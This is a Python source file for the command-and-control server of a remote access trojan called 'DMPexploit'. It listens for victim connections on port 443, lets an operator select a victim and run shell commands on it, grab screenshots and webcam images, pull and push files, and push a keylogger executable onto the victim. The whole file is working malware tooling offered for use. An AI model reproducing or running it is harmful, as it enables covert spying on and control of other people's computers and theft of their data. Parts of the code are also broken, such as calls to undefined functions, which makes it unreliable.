import socket
import sys
import threading
import time
from queue import Queue
import os

# Al0nnso - 2019
# Your dont need to edit the host ( only the port if you want )

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

print('  _____  __  __ _____                _       _ _   ')
print(' |  __ \\|  \\/  |  __ \\              | |     (_) |  ')
print(' | |  | | \\  / | |__) |____  ___ __ | | ___  _| |_ ')
print(' | |  | | |\\/| |  ___/ _ \\ \\/ /  _ \\| |/ _ \\| | __|')
print(' | |__| | |  | | |  |  __/>  <| |_) | | (_) | | |_ ')
print(' |_____/|_|  |_|_|   \\___/_/\\_\\ .__/|_|\\___/|_|\\__|')
print('                              | |                  ')
print('                              |_|                  \n')
print('            Ver 2.0 -IPextern- by Al0nnso')

def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 443
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# bind and list
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def acceptConnection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


def startDMP():

    while True:
        cmd = input(' > ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                sendCommands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(1024)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None

def sendFTP(file,conn,delFile):
    try:
        #size=str(getSize(file))
        #print(size)
        #s.send(size.encode())
        print('unploading...')
        f=open(file,'rb')
        i=f.read(20480)
        while (i):
            conn.send(i)
            i = f.read(20480)
        #s.send(i)
        f.close()
        conn.send(str.encode('complete'))
        #s.send('\n--------------------/CODE'.encode())
        if delFile:
            os.remove(file)
        sleep(2)
        conn.send(str.encode('[+] Removed archive from TEMP'))
        print('finish...')
        #commands(s,data)
        #data=c.recv(1024).decode()
    except:
        print('[X-client]/ERROR-SEND')

def getFTP(file,com,Fval,comando,conn):
    while comando==com:
        print('Getting...')
        if file=='screenshot.png':
            #image='screenshot.png'
            for i in range(0,100,1):
                if not os.path.isfile('screenshot{}.png'.format(i)):
                    file='screenshot{}.png'.format(i)
                    break
        if file=='camera.png':
            #image='camera.png'
            for i in range(0,100,1):
                if not os.path.isfile('camera{}.png'.format(i)):
                    file='camera{}.png'.format(i)
                    break
        conn.send(str.encode(comando))
        f=open(file,'wb')
        img=conn.recv(8024)
        f.write(img)
        while not(Fval in str(img)):
            img=conn.recv(8024)
            print(str(img))
            f.write(img)
        #print('###')
        f.close()
        print('------------------------------------/HEX-CODE')
        break

# Send commands
def sendCommands(conn):
    dot='Comando ~> '
    while True:
        try:
            try:
                resposta = conn.recv(8024)#.decode()
            except:
                print('crio errado porra')
            try:
                print(str(resposta.decode('utf8', 'ignore')))
            except:
                print('nao printo inhaaa')
            #print(resposta.decode())
            try:
                comando = input(dot)
                if len(str.encode(comando)) > 0:
                    if comando=='exit server':
                        try:
                            conn.close()
                            criarSocket()
                        except:
                            print('[client]-Fail to exit_server')
                        
                    elif comando=='exit cmd':
                        try:
                            dot='Comando ~> '
                            conn.send(str.encode(comando))
                            #resposta = conn.recv(1024)
                            print(str(resposta.decode('utf8', 'ignore')))
                        except:
                            print('[client]-Fail to exit')
                        
                    elif comando[:3]=='cmd':
                        try:
                            dot='CMD >'
                            conn.send(str.encode(comando))
                            #resposta = conn.recv(1024)
                            print(str(resposta.decode('utf8', 'ignore')))
                        except:
                            print('[client]-Fail to cmd')
                    
                    #elif comando[:4]=='cname':
                    #    cname=comando[5:]
                    #    f=open('clist.txt','wb')
                    #    f.write('{},{},{}'.format(cname,endereco[0],str(endereco[1])))
                    #    f.close()
                        
                    elif comando=='screenshot':
                        try:
                            getFTP('screenshot.png','screenshot','complete',comando,conn)
                        except:
                            print('[client]-Fail to screenshot')
                        
                    elif comando=='webcam':
                        try:
                            getFTP('camera.png','webcam','complete',comando,conn)
                        except:
                            print('[client]-Fail to webcam')
                        
                    #elif resposta[:6].decode()=='KEYLOG':
                    #    try:
                    #        logger('keylog.txt',resposta.decode())
                    #    except:
                    #        print('[client]-Fail to KEYLOG')
                        
                    #elif resposta.decode()=='get_log':
                    #    try:
                    #        getFTP('Keylogg.txt','get_log','complete',comando,conn)
                    #    except:
                    #        print('[client]-Fail to get_log')
                        
                    elif comando=='viewer':
                        try:
                            conn.send(str.encode(comando))
                        except:
                            print('[client]-Fail to viewer')

                    elif comando[:8]=='download':
                        try:
                            #DWfilename=input('Filename ~>')
                            DWcomando=comando
                            DWfilename=comando[8:]
                            INfile=input('Filename ~> ')
                            print(DWfilename)
                            conn.send(DWcomando.encode())
                            Vfile=conn.recv(1024)
                            print(Vfile[:2].decode())
                            if Vfile[:2].decode() == 'OK':
                                print('[+] DONWLOAD FILE')
                                getFTP(INfile,DWcomando,'complete',comando,conn)
                        except:
                            print('[client]-Fail to download')

                    elif comando[:6]=='upload':
                        try:
                            #global TEMPDIR
                            print('uploading...')
                            #pyautogui.screenshot('{}\\screenshot.png'.format(TEMPDIR))
                            #s.send('capturing'.encode())
                            INfile=comando[7:]
                            DWfilename=input('ArchivePath ~> ')
                            print(DWfilename)
                            if os.path.isfile(DWfilename):
                                print('OK FILE')
                                conn.send(str.encode(comando))
                                print('sending...')
                                sendFTP(DWfilename,conn,False)
                            elif os.path.isdir(DWfilename):
                                print('X DIR')
                                #conn.send(str.encode(comando))
                                #conn.send('XXX'.encode())
                            else:
                                print('X NONE')
                                #conn.send('X NONE'.encode())
                                #conn.send('XXX'.encode())
                            #commands(s,data)
                            #data=c.recv(1024).decode()
                        except:
                            print('[client]-Fail to upload')
                            #conn.send('complete/ERROR-MODULE')
                    elif comando[:6]=='inject':
                        try:
                            if comando[7:]=='skey':
                                if os.path.isfile('simplekey.exe'):
                                    conn.send(str.encode('skey'))
                                    sendFTP('simplekey.exe',conn,False)
                                else:
                                    print('simplekey.exe WTF')
                                    conn.send(str.encode(' '))
                            else:
                                print('injeta oque oxi ?')
                                conn.send(str.encode(' '))
                        except Exception as e:
                            print('[X-client] Fail to inject')
                            print(e)
                    #elif comando[:10] == 'ftp_server':
                    #    conn.send(str.encode(comando))
                        #break
                        '''
                        while True:
                            FTPconn=conn.recv(1024)
                            FTPinput=input('FTP > ')
                            if len(FTPinput) > 0 :
                                conn.send(str.encode(FTPinput))
                                if FTPinput == 'exit':
                                    break
                            else:
                                conn.send(str.encode(' '))
                            print(str(FTPconn.decode('utf8', 'ignore')))
                        '''

                    else:
                        conn.send(str.encode(comando))
                        #resposta = conn.recv(1024)
                        try:
                            print(str(resposta.decode('utf8', 'ignore')))
                        except:
                            print('[-] UTF8-decode')
                            print(str(resposta.decode()))
                else:
                    conn.send(' '.encode())
            except Exception as e:
                print(e)
                print('deu ruim mermao')

        except Exception as e:
            print('[-] Conexao perdida reiniciando....')
            conn.close()
            criarSocket()



# Jobs and workers
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            createSocket()
            bind_socket()
            acceptConnection()
        if x == 2:
            startDMP()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
